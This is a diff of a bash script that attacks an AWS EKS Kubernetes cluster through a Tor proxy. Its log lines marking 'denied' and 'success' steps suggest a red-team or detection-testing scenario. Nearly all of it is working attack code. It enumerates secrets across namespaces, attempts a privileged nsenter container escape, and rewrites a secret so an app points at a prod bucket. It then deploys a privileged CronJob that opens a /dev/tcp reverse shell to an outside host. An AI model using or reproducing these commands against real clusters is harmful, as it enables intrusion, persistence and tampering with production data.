@@ -56,12 +56,14 @@ EOF
 # kube cred setup
 #######################
 
+KUBECTL_PATH=$(command -v kubectl)
+
 # required for kubectl call tunneling
-function kubectl_proxy() {
+function kubectl() {
     HTTPS_PROXY="socks5://torproxy:9050" \
     ALL_PROXY="socks5://torproxy:9050" \
     HTTP_PROXY="socks5://torproxy:9050" \
-    kubectl "$@"
+    $KUBECTL_PATH "$@"
 }
 
 log "public ip: $(curl -s https://icanhazip.com)"
@@ -99,7 +101,7 @@ done
 
 # update kubeconfig regardless
 aws eks update-kubeconfig --name="$(aws eks list-clusters --output text | head -1 | cut -f2)"
-log "available clusters: $(kubectl_proxy config get-clusters)"
+log "available clusters: $(kubectl config get-clusters)"
 
 export AWS_PAGER=""
 PROFILE=default
@@ -115,19 +117,19 @@ entities=("pods" "namespaces" "cronjobs" "secrets" "configmaps" "deployments" "s
 read_actions=("get" "list" "describe")
 for action in "${read_actions[@]}"; do
     for entity in "${entities[@]}"; do
-      log "Running: kubectl_proxy $action $entity -A"
-      kubectl_proxy $action $entity -A 2>&1 | tee -a $LOGFILE
+      log "Running: kubectl $action $entity -A"
+      kubectl $action $entity -A 2>&1 | tee -a $LOGFILE
     done
 done
 
 # denied exec
 log "starting denied exec..."
-RESULT=$(kubectl_proxy exec -it deployment/authapp -n authapp -- /bin/sh -c "echo helloworld") 
+RESULT=$(kubectl exec -it deployment/authapp -n authapp -- /bin/sh -c "echo helloworld") 
 echo $RESULT 2>&1 | tee -a $LOGFILE
 
-# denied kubectl_proxy root
+# denied kubectl root
 log "starting denied run r00t..."
-RESULT=$(kubectl_proxy run r00t -it --rm \
+RESULT=$(kubectl run r00t -it --rm \
   --restart=Never \
   --image nah r00t \
   --overrides '{"spec":{"hostPID": true, "containers":[{"name":"x","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}' "$@")
@@ -135,26 +137,26 @@ echo $RESULT 2>&1 | tee -a $LOGFILE
 
 # denied access
 log "starting denied get secret..."
-kubectl_proxy get secret sh.helm.release.v1.reloader.v1 -n authapp -o json 2>&1 | tee -a $LOGFILE
+kubectl get secret sh.helm.release.v1.reloader.v1 -n authapp -o json 2>&1 | tee -a $LOGFILE
 
 # read only secret
 log "starting success get secret read-only..."
-kubectl_proxy get secret authapp-env-vars -n authapp -o json 2>&1 | tee -a $LOGFILE
+kubectl get secret authapp-env-vars -n authapp -o json 2>&1 | tee -a $LOGFILE
 
 # edit access
 log "starting success get secret read/write..."
-kubectl_proxy get secret s3app-env-vars -n s3app -o json 2>&1 | tee -a $LOGFILE
+kubectl get secret s3app-env-vars -n s3app -o json 2>&1 | tee -a $LOGFILE
 
 log "getting bucket value..."
-BUCKET_NAME=$(kubectl_proxy get secret s3app-env-vars -n s3app -o json | jq -r '.data.BUCKET_NAME')
+BUCKET_NAME=$(kubectl get secret s3app-env-vars -n s3app -o json | jq -r '.data.BUCKET_NAME')
 log "bucket name: $(echo -n $BUCKET_NAME | base64 -d)"
 NEW_BUCKET_NAME=$(echo -n $BUCKET_NAME | base64 -d | sed 's/-dev-/-prod-/g' | base64)
 log "new bucket name: $(echo -n $NEW_BUCKET_NAME | base64 -d)"
 
 # update secret to point to prod bucket
 log "updating secret with new bucket name..."
-kubectl_proxy get secret s3app-env-vars -n s3app -o json | sed "s/$BUCKET_NAME/$NEW_BUCKET_NAME/g" > /tmp/kubernetes_prod_bucket.json
-kubectl_proxy apply -f /tmp/kubernetes_prod_bucket.json
+kubectl get secret s3app-env-vars -n s3app -o json | sed "s/$BUCKET_NAME/$NEW_BUCKET_NAME/g" > /tmp/kubernetes_prod_bucket.json
+kubectl apply -f /tmp/kubernetes_prod_bucket.json
 
 # we should probably curl the admin interface with our token here but this might be enough for now
 log "waiting for pod restart..."
@@ -162,8 +164,13 @@ sleep 30
 
 # next stage is using the attached service account to start a cronjob reverse shell in the cluster
 log "getting s3 service account..."
-SERVICE_ACCOUNT=$(kubectl_proxy get deployment -n s3app s3app -o json | jq -r '.spec.template.spec.serviceAccount')
+SERVICE_ACCOUNT=$(kubectl get deployment -n s3app s3app -o json | jq -r '.spec.template.spec.serviceAccount')
 log "service account: $SERVICE_ACCOUNT"
+
+# now we setup a cronjob to create a pod running the service account
+log "creating cronjob file..."
+# Delete the existing CronJob if it exists
+kubectl delete cronjob reverse-shell-cronjob --namespace=s3app --ignore-not-found 2>&1 | tee -a $LOGFILE
 
 # now we setup a cronjob to create a pod running the service account
 log "creating cronjob file..."
@@ -193,18 +200,16 @@ spec:
               value: "$REVERSE_SHELL_HOST"
             - name: REVERSE_SHELL_PORT
               value: "$REVERSE_SHELL_PORT"
-            command: [
-                "/bin/bash", 
-                "-c", 
-                "apt-get update && apt-get install -y curl unzip python3-pip && curl \"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\" -o \"awscliv2.zip\" && unzip awscliv2.zip && ./aws/install && TASK=kube2s3 /bin/bash -i >& /dev/tcp/$REVERSE_SHELL_HOST/$REVERSE_SHELL_PORT 0>&1"]
+            command: ["/bin/bash", "-c", "apt-get update && apt-get install -y curl unzip python3-pip && curl \"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\" -o \"awscliv2.zip\" && unzip awscliv2.zip && ./aws/install && TASK=kube2s3 /bin/bash -i >& /dev/tcp/$REVERSE_SHELL_HOST/$REVERSE_SHELL_PORT 0>&1"]
             securityContext:
               privileged: true
           restartPolicy: OnFailure
 EOF
 
+
 cat /tmp/kubernetes_prod_cronjob.yaml 2>&1 | tee -a $LOGFILE
 
 log "starting cronjob..."
-kubectl_proxy apply -f /tmp/kubernetes_prod_cronjob.yaml
+kubectl apply -f /tmp/kubernetes_prod_cronjob.yaml 2>&1 | tee -a $LOGFILE
 
 log "done."
